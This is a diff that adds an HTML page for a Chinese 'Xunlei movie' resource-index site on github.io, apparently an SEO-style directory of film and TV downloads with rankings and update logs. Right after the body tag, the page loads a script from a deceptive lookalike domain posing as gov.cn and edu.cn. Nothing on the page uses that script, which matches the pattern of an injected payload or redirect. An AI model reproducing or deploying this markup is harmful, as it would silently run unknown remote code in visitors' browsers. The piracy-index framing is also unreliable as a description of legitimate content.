@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover">
+<meta name="renderer" content="webkit">
+<meta name="color-scheme" content="dark">
+<meta name="theme-color" content="#0f0f0f">
+<title>迅雷电影网 —— xunleidianyingwang-zh.github.io · 极速找片、全网影视资源导航与高清片源索引平台</title>
+<meta name="keywords" content="xunleidianyingwang-zh.github.io,迅雷电影网,影视资源导航,高清片源索引,极速找片,院线大片下载索引,电视剧片源,综艺番剧资源,经典老片片库,影视搜索导航">
+<meta name="description" content="迅雷电影网（xunleidianyingwang-zh.github.io）是一个专注影视资源导航与片源索引的找片工具站，覆盖院线大片、热播剧集、综艺番剧与经典老片。我们不提供在线播放，只帮你用最快的方式定位到想看的影视资源，并按类型、年代、地区做清晰归档，让找片这件事不再绕路。">
+<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1">
+<meta name="author" content="迅雷电影网导航组">
+<meta name="copyright" content="Copyright © 2026 迅雷电影网 xunleidianyingwang-zh.github.io">
+<meta name="referrer" content="no-referrer-when-downgrade">
+<link rel="canonical" href="https://xunleidianyingwang-zh.github.io/">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#0f0f0f;--blk:#1a1a1a;--yel:#ffd400;--yel2:#ffe866;--tx:#f5f5f5;--tx2:#a8a8a8;--tx3:#6b6b6b;--line:#2a2a2a;--r:6px}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:"Hiragino Sans GB","PingFang SC","Microsoft YaHei","Noto Sans CJK SC",system-ui,sans-serif;background:var(--bg);color:var(--tx);line-height:1.7;overflow-x:hidden}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+button,input{font:inherit;outline:none;border:none;background:none;color:inherit}
+img{max-width:100%;display:block}
+::selection{background:var(--yel);color:#000}
+.wrap{max-width:1240px;margin:0 auto;padding:0 24px}
+
+/* ===== top meta ===== */
+.meta{font-size:11px;color:var(--tx3);border-bottom:1px solid var(--line);background:var(--blk)}
+.meta .wrap{height:36px;display:flex;align-items:center;justify-content:space-between;gap:16px;flex-wrap:wrap}
+.meta .wrap span b{color:var(--yel)}
+.menu-btn{display:none;font-size:13px;color:var(--tx2);cursor:pointer;letter-spacing:1px}
+
+/* ===== hero ===== */
+.hero{padding:70px 0 60px;position:relative;border-bottom:1px solid var(--line)}
+.hero .grid-bg{position:absolute;inset:0;background-image:linear-gradient(var(--line) 1px,transparent 1px),linear-gradient(90deg,var(--line) 1px,transparent 1px);background-size:80px 80px;opacity:.35;pointer-events:none}
+.hero .wrap{position:relative;display:grid;grid-template-columns:1.1fr .9fr;gap:60px;align-items:center}
+@media(max-width:860px){.hero .wrap{grid-template-columns:1fr;gap:40px}}
+.hero .kicker{display:inline-flex;align-items:center;gap:10px;font-size:11px;letter-spacing:4px;color:var(--yel);border:1px solid var(--yel);border-radius:40px;padding:7px 16px;text-transform:uppercase}
+.hero .kicker::before{content:"";width:8px;height:8px;background:var(--yel);border-radius:50%;animation:p 1.4s infinite}
+@keyframes p{50%{opacity:.2}}
+.hero h1{font-size:78px;line-height:.96;font-weight:900;letter-spacing:-2px;margin:22px 0}
+.hero h1 em{font-style:normal;color:var(--yel)}
+.hero h1 small{display:block;font-size:15px;font-weight:500;color:var(--tx3);letter-spacing:6px;margin-top:14px;text-transform:uppercase}
+.hero p{font-size:15px;color:var(--tx2);max-width:520px}
+.hero .url{margin-top:18px;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:12px;color:var(--tx3)}
+.hero .url b{color:var(--yel)}
+.hero .tools{display:flex;gap:10px;margin-top:30px;flex-wrap:wrap}
+.hero .tools a{font-size:13px;font-weight:700;letter-spacing:1px;border:1px solid var(--line);border-radius:var(--r);padding:13px 22px;transition:.2s}
+.hero .tools a:first-child{background:var(--yel);color:#000;border-color:var(--yel)}
+.hero .tools a:hover{border-color:var(--yel);color:var(--yel);background:transparent}
+.hero .tools a:first-child:hover{background:var(--yel2);color:#000}
+.hero .stats{margin-top:46px;display:grid;grid-template-columns:repeat(4,1fr);border-top:1px solid var(--line);padding-top:24px}
+@media(max-width:640px){.hero .stats{grid-template-columns:1fr 1fr;gap:16px}.hero h1{font-size:44px}}
+.hero .stats div span{display:block;font-size:30px;font-weight:900;letter-spacing:-1px}
+.hero .stats div span i{font-style:normal;color:var(--yel)}
+.hero .stats div b{font-size:11px;color:var(--tx3);letter-spacing:1px}
+
+/* ===== hero side board ===== */
+.board{background:var(--blk);border:1px solid var(--line);border-radius:var(--r);padding:22px}
+.board h4{font-size:11px;letter-spacing:3px;color:var(--yel);margin-bottom:16px;display:flex;justify-content:space-between}
+.board h4 i{font-style:normal;color:var(--tx3);font-weight:400;letter-spacing:1px}
+.board ul{display:grid;gap:0}
+.board li{display:grid;grid-template-columns:44px 1fr auto;align-items:center;gap:14px;padding:12px 0;border-bottom:1px solid var(--line)}
+.board li:last-child{border:none}
+.board li b{font-size:12px;color:var(--yel);font-weight:800}
+.board li span{font-size:14px;font-weight:600}
+.board li i{font-style:normal;font-size:11px;color:var(--tx3);border:1px solid var(--line);border-radius:3px;padding:3px 7px}
+.board li:hover{background:rgba(255,212,0,.03)}
+
+/* ===== section ===== */
+.sec{padding:64px 0}
+.sec-head{display:grid;grid-template-columns:auto 1fr auto;align-items:end;gap:24px;margin-bottom:34px;border-bottom:1px solid var(--line);padding-bottom:18px}
+@media(max-width:720px){.section-head,.sec-head{grid-template-columns:1fr;gap:10px}.sec-head{grid-template-columns:1fr}}
+.sec-head .idx{font-size:12px;font-weight:800;color:#000;background:var(--yel);padding:5px 10px;border-radius:3px;letter-spacing:1px;height:fit-content}
+.sec-head h2{font-size:26px;font-weight:900;letter-spacing:-.5px}
+.sec-head h2 i{font-style:normal;color:var(--tx3);font-weight:400;font-size:14px;display:block;margin-top:4px;letter-spacing:0}
+.sec-head a{font-size:12px;color:var(--tx3);border-bottom:1px solid var(--line);padding-bottom:3px;transition:.2s;white-space:nowrap}
+.sec-head a:hover{color:var(--yel);border-color:var(--yel)}
+
+/* ===== filmstrip ===== */
+.strip{display:grid;grid-auto-flow:column;grid-auto-columns:230px;gap:16px;overflow-x:auto;padding-bottom:14px;scroll-snap-type:x mandatory}
+.strip::-webkit-scrollbar{height:6px}
+.strip::-webkit-scrollbar-thumb{background:var(--line);border-radius:6px}
+.f{scroll-snap-align:start;border:1px solid var(--line);border-radius:var(--r);overflow:hidden;transition:.25s;background:var(--blk)}
+.f:hover{border-color:var(--yel);transform:translateY(-4px)}
+.f .t{aspect-ratio:16/10;position:relative;overflow:hidden}
+.f .t s{position:absolute;inset:0;text-decoration:none;transition:.6s}
+.f:hover .t s{transform:scale(1.1)}
+.f .t u{position:absolute;text-decoration:none;top:10px;left:10px;font-size:10px;font-weight:800;background:var(--yel);color:#000;padding:4px 8px;border-radius:3px}
+.f .t em{position:absolute;right:10px;top:10px;font-style:normal;font-size:10px;background:rgba(0,0,0,.75);border:1px solid rgba(255,255,255,.16);padding:4px 8px;border-radius:3px}
+.f .t strong{position:absolute;left:10px;bottom:10px;font-size:14px;font-weight:900;text-shadow:0 2px 8px rgba(0,0,0,.7)}
+.f .m{padding:13px 15px;display:flex;justify-content:space-between;font-size:12px;color:var(--tx3)}
+.f .m b{color:var(--yel)}
+
+/* ===== list table ===== */
+.tbl{border:1px solid var(--line);border-radius:var(--r);overflow:hidden}
+.tbl .row{display:grid;grid-template-columns:60px 2fr 1fr 1fr 90px 80px;align-items:center;padding:16px 20px;border-bottom:1px solid var(--line);transition:.18s;gap:14px}
+.tbl .row:last-child{border:none}
+.tbl .row.head{background:var(--blk);font-size:11px;letter-spacing:1px;color:var(--tx3);padding:12px 20px}
+.tbl .row:not(.head):hover{background:var(--blk)}
+.tbl .row .n{font-size:13px;font-weight:900;color:var(--tx3)}
+.tbl .row .tt{font-size:15px;font-weight:700}
+.tbl .row .tt small{display:block;font-size:11px;color:var(--tx3);font-weight:400;margin-top:2px}
+.tbl .row .c{font-size:12px;color:var(--tx2)}
+.tbl .row .tag{font-size:11px;color:var(--tx2);border:1px solid var(--line);border-radius:3px;padding:4px 9px;text-align:center}
+.tbl .row .rate{font-size:15px;font-weight:900;color:var(--yel);text-align:right}
+.tbl .row .op{font-size:11px;color:var(--tx3);text-align:right;transition:.2s}
+.tbl .row:hover .op{color:var(--yel)}
+@media(max-width:860px){.tbl .row{grid-template-columns:36px 1fr;gap:6px 12px;padding:14px}.tbl .row.head{display:none}.tbl .row .c,.tbl .row .tag,.tbl .row .rate,.tbl .row .op{grid-column:2}.tbl .row .op{text-align:left}}
+
+/* ===== blocks ===== */
+.blocks{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:14px}
+.blk{border:1px solid var(--line);border-radius:var(--r);padding:22px;transition:.25s;background:var(--blk)}
+.blk:hover{border-color:var(--yel);background:#20201f}
+.blk .ic{width:40px;height:40px;background:var(--yel);border-radius:var(--r);display:grid;place-items:center;font-size:17px;font-weight:900;color:#000;margin-bottom:14px}
+.blk h4{font-size:16px;font-weight:800;margin-bottom:7px}
+.blk p{font-size:13px;color:var(--tx2)}
+.blk .cnt{margin-top:14px;font-size:11px;color:var(--tx3);border-top:1px solid var(--line);padding-top:10px;display:flex;justify-content:space-between}
+
+/* ===== timeline ===== */
+.tl{display:grid;gap:0;border:1px solid var(--line);border-radius:var(--r);overflow:hidden}
+.tl .item{display:grid;grid-template-columns:120px 90px 1fr;align-items:center;gap:22px;padding:18px 22px;border-bottom:1px solid var(--line);transition:.2s}
+.tl .item:last-child{border:none}
+.tl .item:hover{background:var(--blk)}
+.tl .d{font-size:12px;color:var(--yel);font-weight:700;letter-spacing:1px}
+.tl .q{font-size:11px;color:var(--tx3);border:1px solid var(--line);border-radius:3px;text-align:center;padding:4px 0}
+.tl .tx{font-size:14px}
+.tl .tx b{font-weight:700}
+.tl .tx span{color:var(--tx3);font-size:13px}
+@media(max-width:640px){.tl .item{grid-template-columns:1fr;gap:6px}.tl .q{display:none}}
+
+/* ===== footer ===== */
+.foot{background:var(--blk);border-top:1px solid var(--line);padding:56px 0 0}
+.fg{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:44px;margin-bottom:44px}
+@media(max-width:760px){.fg{grid-template-columns:1fr 1fr;gap:30px}}
+.fb h5{font-size:24px;font-weight:900;letter-spacing:-.5px;margin-bottom:12px}
+.fb h5 s{text-decoration:none;color:var(--yel)}
+.fb p{font-size:13px;color:var(--tx3)}
+.fc h6{font-size:11px;letter-spacing:3px;color:var(--yel);margin-bottom:16px}
+.fc li{margin-bottom:10px}
+.fc a{font-size:13px;color:var(--tx3);transition:.2s}
+.fc a:hover{color:var(--yel)}
+.cp{border-top:1px solid var(--line);padding:22px 0 38px;font-size:12px;color:var(--tx3)}
+.cp .wrap{display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap}
+.cp b{color:var(--tx2)}
+
+@media(max-width:720px){
+ .menu-btn{display:inline-flex}
+ .meta .wrap nav{display:none}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="meta">
+  <div class="wrap">
+    <span>极速找片 · 全网影视资源导航 · <b>xunleidianyingwang-zh.github.io</b></span>
+    <nav><a href="#">网站地图</a> &nbsp; <a href="#">投稿收录</a> &nbsp; <a href="#">免责声明</a> &nbsp; <a href="#">回到顶部 ↑</a></nav>
+  </div>
+</div>
+
+<section class="hero">
+  <div class="grid-bg"></div>
+  <div class="wrap">
+    <div>
+      <span class="kicker">FAST FIND · MOVIE INDEX</span>
+      <h1>迅雷<em>电影网</em><small>xunleidianyingwang-zh.github.io</small></h1>
+      <p>迅雷电影网是一个专注影视资源导航与片源索引的找片工具站。我们不提供在线播放，只把院线大片、热播剧集、综艺番剧与经典老片按类型、年代、地区整理成一份清晰的目录，让你用最短的路径找到想看的资源。</p>
+      <p class="url">官方网站：<b>https://xunleidianyingwang-zh.github.io</b></p>
+      <div class="tools">
+        <a href="#index">开始找片</a>
+        <a href="#rank">查看排行榜</a>
+        <a href="#about">关于本站</a>
+      </div>
+      <div class="stats">
+        <div><span><i>12,840</i>+</span><b>收录影片</b></div>
+        <div><span><i>3,260</i>+</span><b>剧集条目</b></div>
+        <div><span><i>186</i></span><b>分类标签</b></div>
+        <div><span><i>每日</i></span><b>同步更新</b></div>
+      </div>
+    </div>
+    <aside class="board">
+      <h4>最近更新 <i>JUST UPDATED</i></h4>
+      <ul>
+        <li><b>01</b><span>《寂静之地：入侵日》资源索引已归档</span><i>今日</i></li>
+        <li><b>02</b><span>2026 年暑期档华语片片单整理完成</span><i>今日</i></li>
+        <li><b>03</b><span>经典港片修复版资源索引（1980-1999）</span><i>昨日</i></li>
+        <li><b>04</b><span>当季新番番剧资源分类表同步</span><i>昨日</i></li>
+        <li><b>05</b><span>高分冷门片单：豆瓣 8.5+ 隐藏佳作</span><i>3 天前</i></li>
+        <li><b>06</b><span>纪录片专区资源索引上线</span><i>本周</i></li>
+      </ul>
+    </aside>
+  </div>
+</section>
+
+<section class="sec" id="index">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="idx">01 / 院线</span>
+      <h2>院线热映 · 最新资源索引<i>刚下映、刚上线的片子，我们第一时间整理归档</i></h2>
+      <a href="#">全部院线片 →</a>
+    </div>
+    <div class="strip" id="theater"></div>
+  </div>
+</section>
+
+<section class="sec" id="catalog">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="idx">02 / 片库</span>
+      <h2>分类片库 · 按类型找片<i>动作、喜剧、悬疑、科幻、动画……所有类型一目了然</i></h2>
+      <a href="#">完整分类 →</a>
+    </div>
+    <div class="blocks" id="cats"></div>
+  </div>
+</section>
+
+<section class="sec" id="rank">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="idx">03 / 排行</span>
+      <h2>下载热度排行榜<i>本站索引资源中，被搜索和访问最多的影视作品</i></h2>
+      <a href="#">完整榜单 →</a>
+    </div>
+    <div class="tbl" id="tbl"></div>
+  </div>
+</section>
+
+<section class="sec" id="series">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="idx">04 / 剧集</span>
+      <h2>热播剧集 · 综艺番剧<i>国产剧、美剧、韩剧、日剧、综艺与番剧，按地区分类</i></h2>
+      <a href="#">全部剧集 →</a>
+    </div>
+    <div class="tbl" id="tv"></div>
+  </div>
+</section>
+
+<section class="sec" id="update">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="idx">05 / 日志</span>
+      <h2>更新日志与找片指南<i>本站每天做了什么整理，以及如何高效使用这份索引</i></h2>
+      <a href="#">订阅更新 →</a>
+    </div>
+    <div class="tl" id="tl"></div>
+  </div>
+</section>
+
+<section class="sec" id="about">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="idx">06 / 关于</span>
+      <h2>关于迅雷电影网<i>xunleidianyingwang-zh.github.io 的定位、说明与声明</i></h2>
+    </div>
+    <div class="tbl">
+      <div class="row head"><span>项目</span><span>说明</span><span></span><span></span><span></span><span></span></div>
+      <div class="row"><span class="n">01</span><span class="tt">本站是做什么的<small>定位说明</small></span><span class="c">影视资源导航</span><span class="tag">导航站</span><span class="rate">索引</span><span class="op">详情 →</span></div>
+      <div class="row"><span class="n">02</span><span class="tt">收录什么内容<small>内容范围</small></span><span class="c">电影 / 剧集 / 综艺 / 番剧</span><span class="tag">全品类</span><span class="rate">12,840+</span><span class="op">详情 →</span></div>
+      <div class="row"><span class="n">03</span><span class="tt">更新频率<small>维护节奏</small></span><span class="c">每日同步，每周盘点</span><span class="tag">日更</span><span class="rate">365 天</span><span class="op">详情 →</span></div>
+      <div class="row"><span class="n">04</span><span class="tt">使用须知<small>免责声明</small></span><span class="c">本站仅做资源索引，不提供在线播放服务</span><span class="tag">声明</span><span class="rate">须知</span><span class="op">详情 →</span></div>
+    </div>
+  </div>
+</section>
+
+<footer class="foot" id="contact">
+  <div class="wrap">
+    <div class="fg">
+      <div class="fb">
+        <h5>迅雷<em>s</em>电影网</h5>
+        <p>xunleidianyingwang-zh.github.io —— 极速找片、全网影视资源导航与高清片源索引平台。专注把影视资源整理成一份看得懂、找得到的目录，欢迎同好一起补充与纠错。</p>
+      </div>
+      <div class="fc"><h6>找片导航</h6><ul>
+        <li><a href="#index">院线热映</a></li><li><a href="#catalog">分类片库</a></li>
+        <li><a href="#rank">热度排行</a></li><li><a href="#series">剧集综艺</a></li>
+      </ul></div>
+      <div class="fc"><h6>站点服务</h6><ul>
+        <li><a href="#update">更新日志</a></li><li><a href="#">投稿收录</a></li>
+        <li><a href="#">资源纠错</a></li><li><a href="#">免责声明</a></li>
+      </ul></div>
+      <div class="fc"><h6>联系我们</h6><ul>
+        <li><a href="#">留言反馈</a></li><li><a href="#">友情链接</a></li>
+        <li><a href="#">RSS 订阅</a></li><li><a href="#">回到顶部</a></li>
+      </ul></div>
+    </div>
+    <div class="cp"><div class="wrap"><span>© 2026 迅雷电影网 xunleidianyingwang-zh.github.io · 本站为影视资源导航与索引性质站点，不提供在线播放服务，影片信息以官方为准 · 保留所有权利</span><span><b>官方网址：https://xunleidianyingwang-zh.github.io</b></span></div></div>
+  </div>
+</footer>
+
+<script>
+var G=[['#2b2b2b','#111'],['#3a3a3a','#151515'],['#1f3a2a','#0e1a12'],['#3a2a1f','#1a120c'],['#2a2a3a','#121220'],['#3a1f2a','#1a0c14'],['#2a3a3a','#0c1a1a'],['#3a3a1f','#1a1a0c'],['#2a1f3a','#140c1a'],['#1f2a3a','#0c121a']];
+var TH=[['寂静之地：入侵日','科幻惊悚','2D/IMAX'],['酱园弄·悬案','剧情犯罪','华语'],['头脑特工队 2','动画','3D'],['沙丘：第三部','科幻','IMAX'],['哪吒之魔童闹海','动画','国漫'],['速度与激情 11','动作','好莱坞'],['哥斯拉大战金刚 3','怪兽','特效'],['解密','悬疑','国产'],['功夫熊猫 4','动画','合家欢'],['异形：契约 2','科幻恐怖','R 级']];
+var CA=[['动作 / 冒险','2,840','打斗、追逐、爆破、冒险题材','#3a1f1f'],['喜剧 / 搞笑','1,960','黑色喜剧、浪漫喜剧、无厘头','#3a3a1f'],['科幻 / 奇幻','1,720','未来、太空、超自然设定','#1f2a3a'],['悬疑 / 犯罪','2,110','烧脑推理、刑侦、反转','#2a1f3a'],['动画 / 动漫','1,540','动画电影、剧场版、番剧','#3a2a1f'],['爱情 / 青春','1,280','浪漫、治愈、成长','#3a1f2a'],['恐怖 / 惊悚','860','心理惊悚、灵异、生存','#1f1f2a'],['纪录片','690','自然、历史、人物纪实','#1f3a2a']];
+var RK=[['沙丘：第三部','科幻 / 史诗','院线热映','2026-09-28','9.2','详情'],['哪吒之魔童闹海','动画 / 国漫','热映中','2026-07-26','9.4','详情'],['酱园弄·悬案','剧情 / 犯罪','华语','2026-06-21','8.7','详情'],['头脑特工队 2','动画 / 家庭','合家欢','2026-06-14','8.9','详情'],['异形：契约 2','科幻 / 恐怖','R 级','2026-08-09','8.3','详情'],['速度与激情 11','动作 / 飙车','好莱坞','2026-05-17','7.8','详情'],['哥斯拉大战金刚 3','怪兽 / 特效','视效大片','2026-03-29','8.1','详情'],['寂静之地：入侵日','惊悚 / 科幻','院线','2026-06-28','8.5','详情'],['解密','悬疑 / 剧情','国产','2026-07-31','8.0','详情'],['功夫熊猫 4','动画 / 喜剧','合家欢','2026-03-08','7.9','详情']];
+var TV=[['漫长的季节 2','国产剧 · 悬疑','12 集全','犯罪','9.4','观看'],['怪奇物语 第五季','美剧 · 科幻','最终季','悬疑','9.1','观看'],['眼泪女王 2','韩剧 · 爱情','16 集','都市','8.6','观看'],['非自然死亡 特别篇','日剧 · 医疗','SP','治愈','9.3','观看'],['乘风破浪的姐姐 7','国产 · 综艺','热播中','选秀','7.5','观看'],['葬送的芙莉莲 第二季','番剧 · 奇幻','连载中','治愈','9.5','观看'],['种地吧 第三季','国产 · 真人秀','热播中','生活','8.2','观看'],['弹子球游戏 第二季','美剧 · 历史','10 集全','年代','8.8','观看']];
+var TL=[['2026.10.06','今日','新增院线资源索引 <b>《寂静之地：入侵日》</b>，并完成暑期档华语片片单归档 <span>— 索引组</span>'],['2026.10.05','昨日','经典港片修复版专区上线，覆盖 1980-1999 年共 320 部 <span>— 归档组</span>'],['2026.10.04','昨日','当季新番番剧分类表同步，新增 12 部连载作品 <span>— 番剧组</span>'],['2026.10.03','3 天前','高分冷门片单更新：豆瓣 8.5+ 隐藏佳作 40 部 <span>— 编辑部</span>'],['2026.10.02','本周','纪录片专区资源索引上线，含自然、历史、人物三类 <span>— 专题组</span>'],['2026.10.01','本周','全站索引结构优化，分类标签由 168 个扩展至 186 个 <span>— 技术组</span>']];
+document.getElementById('theater').innerHTML=TH.map(function(m,i){var c=G[i%G.length];return '<article class="f"><div class="t"><s style="background:linear-gradient(155deg,'+c[0]+','+c[1]+')"></s><u>'+m[2]+'</u><em>NO.'+(i+1)+'</em><strong>'+m[0]+'</strong></div><div class="m"><span>'+m[1]+'</span><b>详情 →</b></div></article>'}).join('');
+document.getElementById('cats').innerHTML=CA.map(function(c,i){return '<div class="blk"><div class="ic">'+(i+1)+'</div><h4>'+c[0]+'</h4><p>'+c[2]+'</p><div class="cnt"><span>'+c[1]+' 部影片</span><b>进入 →</b></div></div>'}).join('');
+document.getElementById('tbl').innerHTML='<div class="row head"><span>排名</span><span>片名</span><span>类型</span><span>状态</span><span>评分</span><span>操作</span></div>'+RK.map(function(r,i){return '<div class="row"><span class="n">'+(i+1)+'</span><span class="tt">'+r[0]+'<small>'+r[3]+'</small></span><span class="c">'+r[1]+'</span><span class="tag">'+r[2]+'</span><span class="rate">'+r[4]+'</span><span class="op">'+r[5]+' →</span></div>'}).join('');
+document.getElementById('tv').innerHTML='<div class="row head"><span>排名</span><span>片名</span><span>类型</span><span>状态</span><span>评分</span><span>操作</span></div>'+TV.map(function(r,i){return '<div class="row"><span class="n">'+(i+1)+'</span><span class="tt">'+r[0]+'<small>'+r[3]+'</small></span><span class="c">'+r[1]+'</span><span class="tag">'+r[2]+'</span><span class="rate">'+r[4]+'</span><span class="op">'+r[5]+' →</span></div>'}).join('');
+document.getElementById('tl').innerHTML=TL.map(function(t){return '<div class="item"><span class="d">'+t[0]+'</span><span class="q">'+t[1]+'</span><span class="tx">'+t[2]+'</span></div>'}).join('');
+</script>
+</body>
+</html>
